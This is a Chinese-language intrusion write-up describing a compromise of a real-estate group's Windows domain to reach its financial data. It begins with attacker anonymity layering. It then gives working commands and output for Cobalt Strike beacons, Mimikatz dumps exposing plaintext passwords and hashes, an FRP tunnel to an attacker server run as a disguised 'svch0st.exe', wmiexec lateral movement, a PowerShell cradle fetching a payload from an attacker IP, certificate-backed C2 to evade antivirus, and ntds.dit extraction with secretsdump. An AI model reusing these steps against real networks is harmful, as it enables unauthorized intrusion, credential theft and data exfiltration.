**声明：**

**个人行为，他人无关。虚拟目标，切勿带入。未经同意，禁止转载。**

---------------------


# 0x01 匿名准备

## 多重代理+双虚拟机方案：

- 第1层：
物理机流量：匿名网卡+（旧）手机热点

- 第2层：
虚拟机 A（加固、外文操作系统），双网卡，一个网卡设置为 Host-Only 模式，以便跟虚拟机 B 对接；另一个网卡设置为 NAT 模式，以便访问外网。
在虚拟机 A 中安装代理软件（Tor、Wireguard Vpn 等）。运行 Wireguard VPN 作为 Tor 的前置代理。

- 第3层：
攻击机器虚拟机B（加固、外文操作系统），唯一的虚拟网卡设置为【Host-Only】模式。连接到虚拟机 A 里面的代理软件（如 TOR 的 socks 代理），然后通过代理连接到互联网。
其他用途的虚拟机，如用于上传下载文件的虚拟机，查资料的虚拟机等，设置同虚拟机B。

# 0x02 渗透目标

## 目标信息：

 X 国上市地产集团。
根据 net time 存在 x 小时时差（早 x 小时），可以进一步确认是 X 国的目标。
 目前已拿下第一台主机（DMZ 机器）的 system 权限。发现此机器在域中。

```
beacon> shell whoami /user
USER INFORMATION
----------------
User Name           SID     
=================== ========
nt authority\system S-1-5-18
```


## 本机相关信息：

- hostname：SRVHYBEX
- OS：Windows Server 2008 R2
- 域名：hfangdichan.com（已做处理）
- 出网防火墙公网 IP：203.x.x.189
- 内网 IP：192.168.11.248
- 当前权限：nt authority\system
- 当前无管理员在线，最近也无管理员登陆过 


**防火墙状态：**

```
beacon> shell netsh firewall show state
Firewall status:
-------------------------------------------------------------------
Profile                           = Domain
Operational mode                  = Disable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable
Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
26707  TCP       Any      (null)
65530  TCP       Any      (null)
443    TCP       Any      (null)
80     TCP       Any      (null)
```

因为当前是 SYSTEM 权限，当然也可以把进程注入 `explorer.exe` 这种进程获取本机 Administrator 权限，所以我省去了查看补丁等提权信息的收集步骤。


**根据 set 命令得知：**

- 没有 py、JAVA
- 当前可以利用的一些运行环境：PS;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC 



**根据 tasklist /svc 命令判断当前主机：**

- 无杀软
- 进程中有一个 `1assa.exe`，估计是被别的黑客留的


**当前机器开启的共享：**

```
beacon> shell net share
Share name   Resource                        Remark
-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
IRM Template C:\Windows\System32\IRM Template
```


## 渗透目标：


目标是一个地产公司，想要获取其财务信息。

 1. 拿下域控，获取全部域内用户的密码哈希。
 2. 定位财务 OU 相关的主机（如财务系统）及用户，获取该主机上的有价值信息。可能是拖数据库、翻报表等。


# 0x03 域内信息收集
 
 
```
netstat -ano
arp -a
```



```
beacon> shell netstat -ano
[*] Tasked beacon to run: netstat -ano
[+] host called home, sent: 43 bytes
[+] received output:
Active Connections
 Proto  Local Address          Foreign Address        State           PID
 TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
 TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       884
 TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
 TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
 TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       1704
 TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       1704
 TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       1704
 TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2008
 TCP    0.0.0.0:7789           0.0.0.0:0              LISTENING       640
 TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
 TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       540
 TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       984
 TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       152
 TCP    0.0.0.0:49187          0.0.0.0:0              LISTENING       1704
 TCP    0.0.0.0:49199          0.0.0.0:0              LISTENING       588
 TCP    0.0.0.0:49200          0.0.0.0:0              LISTENING       640
 TCP    0.0.0.0:49201          0.0.0.0:0              LISTENING       2720
 TCP    0.0.0.0:50686          0.0.0.0:0              LISTENING       1992
 TCP    0.0.0.0:65530          0.0.0.0:0              LISTENING       152
 TCP    127.0.0.1:4048         0.0.0.0:0              LISTENING       4544
 TCP    127.0.0.1:6149         0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:26285        0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:27138        0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:29054        0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:38111        0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:42674        0.0.0.0:0              LISTENING       640
 TCP    127.0.0.1:50687        0.0.0.0:0              LISTENING       1992
 TCP    127.0.0.1:58657        0.0.0.0:0              LISTENING       640
 TCP    192.168.11.248:80      203.*.*.212:53105   TIME_WAIT       0
 TCP    192.168.11.248:80      203.*.*.212:54451   TIME_WAIT       0
 TCP    192.168.11.248:80      203.*.*.1:59560    TIME_WAIT       0
 TCP    192.168.11.248:139     0.0.0.0:0              LISTENING       4
 TCP    192.168.11.248:1801    0.0.0.0:0              LISTENING       1704
 TCP    192.168.11.248:50686   192.168.11.248:62799   ESTABLISHED     1992
 TCP    192.168.11.248:61043   108.160.142.160:8081   ESTABLISHED     4296
 TCP    192.168.11.248:61443   194.19.235.71:3032     ESTABLISHED     4544
 TCP    192.168.11.248:62799   192.168.11.248:50686   ESTABLISHED     2648
 TCP    192.168.11.248:62809   192.168.0.134:49155    TIME_WAIT       0
 TCP    192.168.11.248:62820   108.160.142.160:80     LAST_ACK        640
 TCP    192.168.11.248:62825   47.*.*.165:80        LAST_ACK        720
 TCP    192.168.11.248:62826   47.*.*.165:80        CLOSE_WAIT      588
 TCP    [::]:80                [::]:0                 LISTENING       4
 TCP    [::]:135               [::]:0                 LISTENING       884
 TCP    [::]:443               [::]:0                 LISTENING       4
 TCP    [::]:445               [::]:0                 LISTENING       4
 TCP    [::]:2103              [::]:0                 LISTENING       1704
 TCP    [::]:2105              [::]:0                 LISTENING       1704
 TCP    [::]:2107              [::]:0                 LISTENING       1704
 TCP    [::]:3389              [::]:0                 LISTENING       2008
 TCP    [::]:47001             [::]:0                 LISTENING       4
 TCP    [::]:49152             [::]:0                 LISTENING       540
 TCP    [::]:49153             [::]:0                 LISTENING       984
 TCP    [::]:49154             [::]:0                 LISTENING       152
 TCP    [::]:49187             [::]:0                 LISTENING       1704
 TCP    [::]:49199             [::]:0                 LISTENING       588
 TCP    [::]:49200             [::]:0                 LISTENING       640
 TCP    [::]:49201             [::]:0                 LISTENING       2720
 TCP    [::]:50686             [::]:0                 LISTENING       1992
 TCP    [::1]:50687            [::]:0                 LISTENING       1992
 TCP    [fe80::9808:954:1c7b:d9c8%14]:1801  [::]:0                 LISTENING       1704
 UDP    0.0.0.0:123            *:*                                    464
 UDP    0.0.0.0:500            *:*                                    152
 UDP    0.0.0.0:1434           *:*                                    2316
 UDP    0.0.0.0:4500           *:*                                    152
 UDP    0.0.0.0:5355           *:*                                    720
 UDP    0.0.0.0:27930          *:*                                    4712
 UDP    0.0.0.0:55074          *:*                                    4712
 UDP    0.0.0.0:60116          *:*                                    4712
 UDP    0.0.0.0:60117          *:*                                    4712
 UDP    0.0.0.0:60118          *:*                                    4712
 UDP    0.0.0.0:60119          *:*                                    4712
 UDP    0.0.0.0:60120          *:*                                    4712
 UDP    127.0.0.1:54690        *:*                                    640
 UDP    127.0.0.1:54692        *:*                                    720
 UDP    127.0.0.1:56130        *:*                                    152
 UDP    127.0.0.1:61059        *:*                                    2648
 UDP    192.168.11.248:137     *:*                                    4
 UDP    192.168.11.248:138     *:*                                    4
 UDP    [::]:123               *:*                                    464
 UDP    [::]:500               *:*                                    152
 UDP    [::]:1434              *:*                                    2316
 UDP    [::]:4500              *:*                                    152
 UDP    [::]:5355              *:*                                    720
 UDP    [fe80::9808:954:1c7b:d9c8%14]:546  *:*                                    984
``` 



```
beacon> shell arp -a
[*] Tasked beacon to run: arp -a
[+] host called home, sent: 37 bytes
[+] received output:
Interface: 192.168.11.248 --- 0xe
 Internet Address      Physical Address      Type
 192.168.11.2          00-0c-29-16-da-92     dynamic   
 192.168.11.3          00-50-56-ac-0b-56     dynamic   
 192.168.11.4          00-50-56-ac-7c-3a     dynamic   
 192.168.11.5          00-50-56-ac-3a-6f     dynamic   
 192.168.11.6          00-50-56-ac-08-8b     dynamic   
 192.168.11.7          00-50-56-ac-4c-cd     dynamic   
 192.168.11.8          00-50-56-ac-25-9b     dynamic   
 192.168.11.9          00-50-56-81-7b-ac     dynamic   
 192.168.11.10         00-50-56-ac-5b-e3     dynamic   
 192.168.11.11         00-50-56-ac-13-53     dynamic   
 192.168.11.12         00-50-56-ac-48-30     dynamic   
 192.168.11.15         00-50-56-ac-7f-38     dynamic   
 192.168.11.16         00-50-56-ac-32-ad     dynamic   
 192.168.11.17         00-50-56-ac-02-9d     dynamic   
 192.168.11.18         00-50-56-ac-2e-cf     dynamic   
 192.168.11.19         00-50-56-ac-0f-97     dynamic   
 192.168.11.20         00-50-56-ac-27-1a     dynamic   
 192.168.11.21         00-50-56-ac-28-6d     dynamic   
 192.168.11.22         00-50-56-ac-77-d0     dynamic   
 192.168.11.23         00-50-56-ac-00-1f     dynamic   
 192.168.11.24         00-50-56-ac-2e-20     dynamic   
 192.168.11.25         00-50-56-ac-3c-8d     dynamic   
 192.168.11.27         00-50-56-ac-39-75     dynamic   
 192.168.11.28         00-50-56-ac-6d-4a     dynamic   
 192.168.11.29         00-50-56-ac-17-91     dynamic   
 192.168.11.30         00-50-56-81-7b-ac     dynamic   
 192.168.11.31         00-50-56-ac-7a-e6     dynamic   
 192.168.11.32         00-50-56-ac-1b-59     dynamic   
 192.168.11.33         00-50-56-ac-45-63     dynamic   
 192.168.11.34         00-50-56-ac-15-df     dynamic   
 192.168.11.35         00-50-56-ac-33-c7     dynamic   
 192.168.11.36         00-50-56-ac-4d-8f     dynamic   
 192.168.11.37         00-50-56-ac-3c-0d     dynamic   
 192.168.11.41         00-50-56-ac-6c-ca     dynamic   
 192.168.11.42         00-50-56-ac-71-c4     dynamic   
 192.168.11.43         00-50-56-ac-78-8c     dynamic   
 192.168.11.44         00-50-56-ac-1a-e4     dynamic   
 192.168.11.45         00-50-56-ac-55-d2     dynamic   
 192.168.11.46         00-50-56-ac-35-f0     dynamic   
 192.168.11.47         00-50-56-ac-20-15     dynamic   
 192.168.11.48         00-50-56-ac-50-43     dynamic   
 192.168.11.49         00-50-56-ac-58-db     dynamic   
 192.168.11.50         00-50-56-ac-49-e7     dynamic   
 192.168.11.51         00-50-56-ac-6f-4f     dynamic   
 192.168.11.52         00-50-56-ac-4c-c1     dynamic   
 192.168.11.53         00-50-56-ac-6a-5a     dynamic   
 192.168.11.54         00-50-56-ac-16-f7     dynamic   
 192.168.11.69         00-50-56-ac-1c-ce     dynamic   
 192.168.11.77         00-50-56-ac-55-3f     dynamic   
 192.168.11.226        00-50-56-86-39-85     dynamic   
 192.168.11.227        00-50-56-ac-7b-92     dynamic   
 192.168.11.228        00-0c-29-e1-27-7e     dynamic   
 192.168.11.255        ff-ff-ff-ff-ff-ff     static    
 224.0.0.252           01-00-5e-00-00-fc     static    
 255.255.255.255       ff-ff-ff-ff-ff-ff     static    
```


根据此两条命令的执行结果可以看出：

- 此机器不是域控（未开 389 端口）
- 此机器开放了80、443、135、445、3389 端口
- 此机器 TCP 协议出网
- 此机器通内网的 192.168.11.*/24 网段，此网段数台主机存活
- 此机器通内网的 192.168.0.*/24 网段


## Mimikatz 抓取凭据：

```
beacon> logonpasswords
本地用户：
.\Administrator e19ccf75ee54e06b06a5907af13cef42
SRVHYBEX\Administrator P@ssw0rd
SRVHYBEX\Administrator e19ccf75ee54e06b06a5907af13cef42
HFANGDICHAN.LOCAL\administrator P@ssw0rd
域用户：
HFANGDICHAN\irm_service 0c3c8ea63c5181a5cdf24a83fb54a2e6
HFANGDICHAN\irm_service iydKk8er^f123
```


## 域内信息收集：

- 域名：HFANGDICHAN.LOCAL
- `shell net group "domain admins" /domain` 获取了域管理员用户
- `shell net users /domain` 获取了全部域内用户，大概判断了域的规模
- 域控机器：

```
snowming19 beacon> shell net group "domain controllers" /domain
The request will be processed at a domain controller for domain hfangdichan.local.
Group name     Domain Controllers
Comment        All domain controllers in the domain
Members
-------------------------------------------------------------------------------
AD1$                     AD2$                     AD3$                     
The command completed successfully.
beacon> shell ping -n 1 AD1
Pinging AD1.hfangdichan.com [192.168.11.2] with 32 bytes of data:
Reply from 192.168.11.2: bytes=32 time<1ms TTL=128
Ping statistics for 192.168.11.2:
   Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
   Minimum = 0ms, Maximum = 0ms, Average = 0ms
beacon> shell ping -n 1 AD2
[*] Tasked beacon to run: ping -n 1 AD2
Pinging AD2.hfangdichan.com [192.168.0.134] with 32 bytes of data:
Reply from 192.168.0.134: bytes=32 time=1ms TTL=124
Ping statistics for 192.168.0.134:
   Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
   Minimum = 1ms, Maximum = 1ms, Average = 1ms
beacon> shell ping -n 1 AD3
Ping request could not find host AD3. Please check the name and try again.
```

AD3 无法获取 IP。可能是禁 ICMP 响应了。也可能是此域控机器不再存活。毕竟、LDAP 存的都是记录，不一定都存活。于是进行测试：

```
snowming1000 beacon> shell net time \\AD1
[*] Tasked beacon to run: net time \\AD1
[+] host called home, sent: 90 bytes
[+] received output:
Current time at \\AD1 is 6/9/2020 1:50:43 PM
beacon> shell net time \\AD2
[*] Tasked beacon to run: net time \\AD2
[+] host called home, sent: 45 bytes
[+] received output:
Current time at \\AD2 is 6/9/2020 1:52:43 PM
beacon> shell net time \\AD3
[*] Tasked beacon to run: net time \\AD3
[+] host called home, sent: 45 bytes
[+] received output:
The service has not been started.
More help is available by typing NET HELPMSG 2184.
```


发现 AD3 已经下线了，但是到底是永久下线还是临时下线，以后还可以留意一下。不过一般来说两台 DC 就够了，一主一副。

对这两台 DC 进行 portscan： 


![title](https://leanote.com/api/file/getImage?fileId=5efbf0baab64411e260003b7)
 
![title](https://leanote.com/api/file/getImage?fileId=5efbf108ab64411c280003ff)


 根据 `platform: 500`（NT 内核）、`version:6.1`（NT 6.1），可以看出这两台 AD 的操作系统都是 Windows Server 2008 R2。 


>注：
 1. [2.2.2.6 Platform IDs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/4e970d48-73ce-464d-b033-d154a43982bc)
 2. [List of Microsoft Windows versions](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)


**总结一下关于 DC 的信息：**


|编号	|hostname|	内网IP|	操作系统|	备注|
| :--: |:--: |:--: |:--: |:--: |
|1|	AD1	192.168.11.2	|Windows Server 2008 R2|	PDC|
|2	|AD2	|192.168.0.134|	Windows Server 2008 R2|	BDC|
|3	|AD3|	?|	?|	不再存活|



通过 `shell net group "domain computers" /domain`  查看域内所有的计算机名。
通过 `shell net group /domain` 命令查看域分组。
域密码策略：


```
snowming10000 beacon> shell net accounts /domain

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          60
Minimum password length:                              6
Length of password history maintained:                20
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY

The command completed successfully.
```


>注：
<u>查看某一本地用户的密码最近一次修改时间：</u>
net user username /do
<u>查看域用户的密码最近一次修改时间：</u>
shell net user 域用户名 /domain
比如：shell net user administrator /domain，查到的就是域的 administator（域管）的密码策略而不是本机的 administrator 的密码策略。因为加了 `/domain` 就是查域的。
<u>域用户身份登录：</u>
如果在查域用户策略时候遇到了error 5拒绝访问，那是因为没有以域用户身份登陆。必须以域用户身份登录才行。
<u>system权限：</u>
不过用 system 权限也可以。因为 system 是被判定为域用户的。因为 system 是机器用户，属于 computer 类，而 computer 类继承于 user 类。所以机器用户可以看做是域用户，两者等效。


可以使用域内信息收集工具进行域内信息收集。域内信息收集工具比如：

- adfind
- powerviewer
- ad explorer

使用工具的好处就是：跑一次就可以收集到所有信息。不用一条一条的查。因为有的时候，今天上的来，明天也许就不行了。但是盯着都是很久的。所以就需要不停的收集对抗，直到达到目的。

我使用 adfind 对域内信息进行了收集，adfind 可以在域内的任意一台机器上使用。输出结果重定向为文件。

>Todo：
当前这些信息都是手工整理阶段，后期需要使用 BloodHunt 对其进行图形化和建模化，方便快速查找。

# 0x04 内网通道

## 搭建 FRP 隧道：


因为要横向的机器是内网 IP，所以先要把内网流量代理出来使用。分析当前的网络环境：这是一种比较理想的网络环境，目标机可以正常访问互联网。这样设想的方式有两种：

 1. FRP(socks5)
 2. Cobalt Strike 自带的 socks4a 功能



出于速度的考虑，准备选用 FRP 隧道来打通目标的内网通道。


C2 机器上开 FRP 服务端：

frps.ini：
```
[common]
bind_port = 6666
```

```
chmod +x frps
sudo ./frps -c ./frps.ini
```

目标机器上开 FRP 客户端：

DMI3D88.tmp：

```
[common]
server_addr = 47.x.x.165
server_port = 6666
[plugin_socks5]
type = tcp
remote_port = 8088
plugin = socks5
use_encryption = true 
use_compression = true
```

```
shell C:\Windows\Temp\svch0st.exe -c C:\Windows\Temp\DMI3D88.tmp
```


FRP 隧道已通：
【服务端】
![title](https://leanote.com/api/file/getImage?fileId=5efbf3f7ab64411e260003f9)


【客户端】
![title](https://leanote.com/api/file/getImage?fileId=5efbf413ab64411c2800045b)


通过 Proxychains4 使用 FRP 隧道：
【配置】
```
apt install proxychains4 -y
```

```
vi /etc/proxychains4.conf
#在最后一行加上
# 8088 是目标机器本机 socks5 监听端口
# 在 C2 使用就是用127.0.0.1就可以，在本地 kali 配置的话就需要填公网 ip
[ProxyList]
socks5 127.0.0.1 8088
```



进行测试：


![title](https://leanote.com/api/file/getImage?fileId=5efbf45fab64411e26000401)



测试成功！
>注：192.168.0.134 是 AD2 这台主机，其445端口开放。
![title](https://leanote.com/api/file/getImage?fileId=5efbf494ab64411c28000465)



# 0x05 横向移动

因为前面在初始权限的主机上已经使用 Mimikatz 抓到了域账号的明文密码和哈希，所以现在打算使用 wmiexec 来进行横向。


```
# 域用户：
DTGSIAM\irm_service 0c3c8ea63c5181a5cdf24a83fb54a2e6
DTGSIAM\irm_service iydKk8er^f123
```


因为，使用 wmiexec.py 脚本进行横向的前提是：

 1. 被横向主机开启了 135 端口（135 端口是 WMIC 默认的管理端口）
 2. 被横向主机开启了 445 端口（wimcexec 使用445端口传回显）


>注：
准确说、如果要把输出结果写文件的话，需要用smb回传。
如果写注册表，直接用 wmi 就能回来了，就不需要走445了。
sharpwmi 这个项目不依赖139和445端口，但是还需要依赖 135 端口。 


发现 AD1 和 AD2 都开启了 135、445 端口。

C2 机器上输入：

```
proxychains4 python wmiexec.py HFANGDICHAN/irm_service:iydKk8er^f123@192.168.0.134
```


成功获取 AD2 主机的交互式 shell：

![title](https://leanote.com/api/file/getImage?fileId=5efbf56eab64411e26000410)


# 0x06 CS 合法证书 + Powershell 上线 AD2


个人习惯，想要使 AD2 CS 上线。


## 网络环境探测


```
netstat -ano
```



![title](https://leanote.com/api/file/getImage?fileId=5efbf5ccab64411c28000480)


![title](https://leanote.com/api/file/getImage?fileId=5efbf5deab64411c28000481)

![title](https://leanote.com/api/file/getImage?fileId=5efbf5eaab64411e2600041a)


- 通 192.168.11.x 内网段
- 通外网，但主要是 80、443 端口

ICMP 出网：

![title](https://leanote.com/api/file/getImage?fileId=5efbf61aab64411e2600041d)


TCP 出网：


![title](https://leanote.com/api/file/getImage?fileId=5efbf636ab64411e26000420)
>注：这里不应该 ping 百度的，会暴露国籍。

通过 TRACERT 看出来到出网就1跳，所以应该没有什么流量监测或者网络防御设备。

![title](https://leanote.com/api/file/getImage?fileId=5efbf65cab64411c2800048d)


看到可以直接 TCP 出网，外加目标是 Windows2008 R2 环境，没 Windows Defender 的阻力，于是我直接用 reverse_http 类型监听器生成的 Powershell payload 进行上线，但是上线失败。

![title](https://leanote.com/api/file/getImage?fileId=5efbf681ab64411c28000490)

```
powershell.exe -nop "((new-object net.webclient).downloadstring('http://47.52.x.x:443/a'))" 
```

发现 powershell payload 都没下载成功，因为我使用的端口已经是 443，所以排除了放行端口的问题。但是把 payload 托管到 pastebin 网站上，IEX 执行可以正常上线，但是上线之后的 shell，无法执行命令，仅有心跳。所以猜测 http 通信遭到了拦截。


## AV 探测

- `net start`
- `C:\>tasklist /svc`

|系统进程|	杀软名称|
| :--: | :--: |
|TMBMSRV.exe	|趋势杀毒|
|ntrtscan.exe	|趋势反病毒应用程序|
|NTRTSCAN.exe	|趋势科技|
|PCCNTMON.exe|	PC-cillin|
|TMLISTEN.exe|	趋势科技|

所以这台机器上有趋势。得知是趋势，那么就不太担心了，毕竟趋势相对挺好过的。

## 合法证书 + Powershell 域名 https 上线


**获取 SSL 证书**

先购买一个用于上线的域名，然后用域名申请一个 SSL 证书。我就使用 https://freessl.cn/ 用我的 `spoofdomain.com` 域名申请好了证书。
> 可参考：[3分钟搞定从申请ssl证书到域名服务器配置](https://segmentfault.com/a/1190000019798737)



**创建一个 keystore**

将 ssl 证书上传到 CS 团队服务器，使用以下命令为 CS 生成 keystore：

```
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out spoofdomain.p12 -name spoofdomain.com -passout pass:mypass
keytool -importkeystore -deststorepass mypass -destkeypass mypass -destkeystore spoofdomain.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass mypass -alias spoofdomain.com
```


**Malleable C2 profile**


将 keystore 加入 Malleable C2 profile 中：

```
https-certificate {
    set keystore "spoofdomain.store";
    set password "mypass";
}
```

然后在启动 CS 的时候指定此 C2 profile：

```
nohup ./teamserver 47.x.x.x password c2.profile &
```

此时当团队服务器启动，其就会使用提供的 keystore 并启用 SSL 文件托管。

**reverse_https 监听器**

创建一个 `reverse_https` 的监听器，在 `HTTPS Hosts` 和 `HTTPS Host(stager)` 以及 `HTTPS Host Header` 这里指定域名：


![title](https://leanote.com/api/file/getImage?fileId=5efbf8e8ab64411c280004ee)

**Scripted Web Delivery**


![title](https://leanote.com/api/file/getImage?fileId=5efbf8f4ab64411e26000467)

然后这个 ps 命令去上线，就可以过趋势正常上线并且正常通信。

至此 AD2 Cobalt Strike 上线成功。


# 0x07  一个乌龙 - 192.168.0.131

在 AD2 的 Beacon Shell 中使用命令进行查看，发现域控用户有进程，于是使用 mimikatz 进行凭据抓取。结果除了跑出来两个域管账号之外，还跑出来了 192.168.0.131 的凭据。

![title](https://leanote.com/api/file/getImage?fileId=5efbf93bab64411e2600046b)



这个机器 HFANGDICHAN-SHARE 开了 445 和 139 端口，但是没有开 135 端口。445 端口的 banner 信息显示其为 Windows 2008 R2 机器。

所以无法使用 wmiexec 脚本，因为 wmi 依赖 135 端口。但是看上去可以使用 SMB Beacon，因为满足：

- 445 端口开放
- 抓取到了欲横向主机的凭据，并且是 administrator 权限

```
192.168.0.131\192.168.0.131\admin Qnap@dm!n
```

对这个 SHARE 主机我产生了好奇，想通过 SMB Beacon link 上去试试。但是在进行凭据填充的时候遇到了以下报错：


![title](https://leanote.com/api/file/getImage?fileId=5efbf9afab64411c280004f9)


根据报错显示共享服务器未共享 `ADMIN$` 和 `IPC$` 资源。（参考：[The server is not configured for remote administration.](http://intelligentsystemsmonitoring.com/knowledgebase/windows-operating-system/the-server-is-not-configured-for-remote-administration-6773/)）

查看 192.168.0.131 开放的共享：

```
beacon> net share \\192.168.0.131

Shares at \\192.168.0.131:

 Share name                       Comment
 ----------                       -------
 Web                              System default share
 Public                           System default share
 DTGO Share                       
 Multimedia                       System default share
 homes                            System default share
 00-Restore                       
 Download                         System default share
 IPC$                             IPC Service ()
```


的确没有 `ADMIN$` 和 `C$`，只有 `IPC$` 。

总之，因为 192.168.0.131 没开 `ADMIN$` 和 `C$` ，所以无法通过 SMB Beacon 上线（使用命名管道横向的话，SMB Beacon 上线的时候需要向 `ADMIN$` 路径上传一个 exe。但是也可以生成 ps1 远程加载，这样就可以无文件 IEX 执行）。

但是用 impacket 套件中的 smbexec 脚本、使用域管账号也无法向此机器横向： 


```
root@CS:~/impacket/examples# proxychains4 python smbexec.py HFANGDICHAN/Administrator:ruj9yJ\'@192.168.0.131

Impacket v0.9.22.dev1+20200607.100119.b5c61678 - Copyright 2020 SecureAuth Corporation

[-] nca_s_op_rng_error
```


![title](https://leanote.com/api/file/getImage?fileId=5efbfa4eab64411e2600047c)


从 MSF 的 smb_version 这个扫描模块可以看出：这个机器的 445 端口开的是 Samba 服务，所以此机器应该是一台 Linux 机器。并且此机器开了 22 端口，一般 Windows 不会开此端口。

所以这台机器应该是一台 Linux 机器：

![title](https://leanote.com/api/file/getImage?fileId=5efbfa80ab64411e26000480)

只是不知道 Cobalt Strike 445 端口 banner 识别是怎么做的，产生了误判。



# 0x08 信息收集

在 AD2 的 Beacon Shell 中使用命令进行查看，发现域控用户有进程，于是使用 mimikatz 进行凭据抓取：

抓到了两个域管理员用户的凭据：

```
HFANGDICHAN\surachet_ch ruj9yJ'
HFANGDICHAN\Surachet_ch 66ea9511fb9722ea64dcbec2a831b293
HFANGDICHAN\Administrator ruj9yJ'
HFANGDICHAN\Administrator 66ea9511fb9722ea64dcbec2a831b293
```


## 使用卷影拷贝服务提取 ntds.dit

使用卷影拷贝服务提取 ntds.dit 有多种方法，如：

- 通过 ntdsutil.exe 提取 ntds.dit
- 利用 vssadmin 提取 ntds.dit
- 利用 vssown.vbs 提取 ntds.dit
- 使用 ntdsutil 的 IFM 创建卷影拷贝
- 使用 diskshadow 导出 ntds.dit

在此选择<u>使用 ntdsutil 的 IFM 创建卷影拷贝</u>。

 在域控 AD1 中以管理员模式打开命令行环境，执行命令：
 
 
```
proxychains4 python wmiexec.py HFANGDICHAN/Administrator:ruj9yJ\'@192.168.0.134
ntdsutil "ac i ntds" "ifm" "create full c:/test" q q
```


执行完成后，会在 `c:\` 下面新建 test 文件夹，将 ntds.dit 复制到 `c:\test\Active Directory\` 文件夹下；将 SYSTEM 和 SECURITY 两项复制到 `c:\test\registry\` 文件夹下。

通过 get 方法在交互式 shell 中把这两项下载到本地。然后在目标机器上将 test 文件夹删除：

``` 
rmdir /s/q test
```

然后就完成了收尾工作。 


## 导出 NTDS.DIT 中的域散列值


使用 impacket 工具包中的 `secretsdump` 脚本导出散列值。

```
python secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile result
```


然后就导出了 ntds.dit 中的所有散列值，主要是生成了如下三个文件：

- `result.ntds.cleartext`：为空
- `result.ntds`
- `result.ntds.kerberos`

具体内容不再展示。

 
 
